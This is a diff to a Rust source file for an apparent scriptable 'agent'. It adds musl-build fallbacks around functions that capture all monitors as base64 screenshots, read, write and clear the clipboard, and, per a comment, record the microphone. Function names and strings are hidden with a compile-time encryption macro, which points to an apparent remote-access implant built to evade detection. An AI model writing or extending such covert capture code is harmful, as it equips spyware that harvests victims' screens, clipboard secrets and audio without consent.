@@ -1,8 +1,10 @@
 // src/agent/scripting/media.rs
 use rhai::Engine;
 use std::{fs, io::Cursor, time::Duration};
+#[cfg(not(target_env = "musl"))]
 use screenshots::Screen;
 use image::ImageOutputFormat;
+#[cfg(not(target_env = "musl"))]
 use arboard::Clipboard;
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 use crate::utils;
@@ -14,6 +16,7 @@ pub fn register(engine: &mut Engine) {
     // ── Screenshot ────────────────────────────────────────────────────────────
     // Returns a JSON array: [{monitor_index, width, height, b64}]
 
+#[cfg(not(target_env = "musl"))]
     engine.register_fn(&aes_str!("internal_screenshot"), || -> String {
         let screens  = Screen::all().unwrap_or_default();
         let mut results = Vec::new();
@@ -33,9 +36,16 @@ pub fn register(engine: &mut Engine) {
         }
         serde_json::to_string(&results).unwrap_or("[]".into())
     });
+    #[cfg(target_env = "musl")]
+    engine.register_fn(&aes_str!("internal_screenshot"), || -> String {
+        // X11 capture is not available in fully-static musl builds.
+        serde_json::to_string(&Vec::<serde_json::Value>::new()).unwrap_or("[]".into())
+    });
+
 
     // ── Clipboard ─────────────────────────────────────────────────────────────
 
+#[cfg(not(target_env = "musl"))]
     engine.register_fn(&aes_str!("internal_clipboard_get"), || -> String {
         match Clipboard::new() {
             Ok(mut cb) => cb.get_text().unwrap_or_else(|e| format!("{}{}", aes_str!("[Empty/Image] "), e)),
@@ -43,6 +53,13 @@ pub fn register(engine: &mut Engine) {
         }
     });
 
+    #[cfg(target_env = "musl")]
+    engine.register_fn(&aes_str!("internal_clipboard_get"), || -> String {
+        aes_str!("unavailable on this build").into()
+    });
+
+
+#[cfg(not(target_env = "musl"))]
     engine.register_fn(&aes_str!("internal_clipboard_set"), |text: &str| -> String {
         match Clipboard::new() {
             Ok(mut cb) => match cb.set_text(text) {
@@ -53,6 +70,13 @@ pub fn register(engine: &mut Engine) {
         }
     });
 
+    #[cfg(target_env = "musl")]
+    engine.register_fn(&aes_str!("internal_clipboard_set"), |_text: &str| -> String {
+        aes_str!("unavailable on this build")
+    });
+
+
+#[cfg(not(target_env = "musl"))]
     engine.register_fn(&aes_str!("internal_clipboard_clear"), || -> String {
         match Clipboard::new() {
             Ok(mut cb) => match cb.clear() {
@@ -62,6 +86,12 @@ pub fn register(engine: &mut Engine) {
             Err(e) => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
         }
     });
+
+    #[cfg(target_env = "musl")]
+    engine.register_fn(&aes_str!("internal_clipboard_clear"), || -> String {
+        aes_str!("unavailable on this build")
+    });
+
 
     // ── Microphone ────────────────────────────────────────────────────────────
     // Shell-based recording - requires `arecord` (Linux), `sox`/`ffmpeg` (macOS),
